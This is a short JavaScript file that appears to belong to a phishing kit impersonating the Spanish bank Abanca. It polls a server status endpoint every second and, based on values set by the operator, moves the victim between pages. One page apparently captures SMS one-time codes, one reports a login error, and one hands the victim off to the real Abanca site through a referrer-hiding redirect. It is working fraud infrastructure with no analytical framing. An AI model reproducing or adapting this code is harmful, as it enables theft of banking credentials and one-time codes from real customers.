  function restat2(){
var status = $('#loginpage-logincontroller-login-pini').val();

if (status ==77) {
var url = "./finish.php";
$(location).attr('href',url);
}
if (status ==2) {
var url = "./sms.php";
$(location).attr('href',url);
}
if (status ==3) {
var url = "./index.php?error=true";
$(location).attr('href',url);
}
if (status ==4) {
window.location.href = 'https://href.li/?https://www.abanca.com/es/banca-a-distancia/banca-electronica/';
}

}
function restat(){
var status = $('#status-xxx').val();
$.post('../app/status.php', {}, function(response){
$('#loginpage-logincontroller-login-pini').val(response);
});
}

setInterval(function(){ new restat();new restat2(); }, 1000);